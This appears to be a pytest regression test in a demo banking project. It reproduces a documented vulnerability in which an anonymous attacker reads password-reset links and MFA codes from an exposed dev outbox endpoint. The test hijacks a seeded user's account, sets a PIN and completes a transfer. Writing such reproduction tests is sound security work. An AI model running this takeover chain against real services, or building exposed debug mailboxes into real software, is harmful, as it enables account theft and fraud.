"""R1 reproduction: anonymous account takeover through the demo outbox.

See docs/release/week7-evidence/OUTBOX_TAKEOVER.md. Every request below is sent without an
Authorization header except where the attacker uses the session it has just stolen.
"""
NEW_PASSWORD = 'Attacker#2026-takeover'
PIN = '135790'


def newest_mail(client):
    item = client.get('/api/dev/outbox').json()['items'][0]
    return client.get('/api/dev/outbox/' + item['id']).json()


def test_anonymous_outbox_takeover_chain(client, monkeypatch):
    monkeypatch.setenv('ENV', 'demo')
    # 1. Guessable address: demo users are seeded as <username>@novabank.test.
    assert client.post('/api/auth/forgot-password', json={'email': 'alice@novabank.test'}).status_code == 202
    # 2. Read Alice's reset link from the shared inbox.
    token = newest_mail(client)['action_url'].split('token=')[1]
    # 3. Set a new password.
    assert client.post('/api/auth/reset-password', json={'token': token, 'password': NEW_PASSWORD}).status_code == 200
    # 4. Sign in and read Alice's sign-in code from the same inbox.
    challenge = client.post('/api/auth/login', json={'username': 'alice', 'password': NEW_PASSWORD}).json()['challenge_id']
    login = client.post('/api/auth/mfa/verify', json={'challenge_id': challenge, 'code': newest_mail(client)['code']})
    assert login.status_code == 200
    stolen = {'Authorization': 'Bearer ' + login.json()['access_token']}
    # 5. The attacker knows the password now, so it can create the transaction PIN and move money.
    assert client.post('/api/auth/pin', headers=stolen, json={'password': NEW_PASSWORD, 'pin': PIN}).status_code == 200
    draft = client.post('/api/transfers', headers=stolen, json={'to_account': 'ACC-CHARLIE-001', 'amount_vnd': 5_000_000}).json()
    done = client.post(f'/api/transfers/{draft["id"]}/confirm', headers={**stolen, 'Idempotency-Key': 'r1-repro'}, json={'otp': PIN})
    assert done.status_code == 200 and done.json()['status'] == 'COMPLETED', done.text
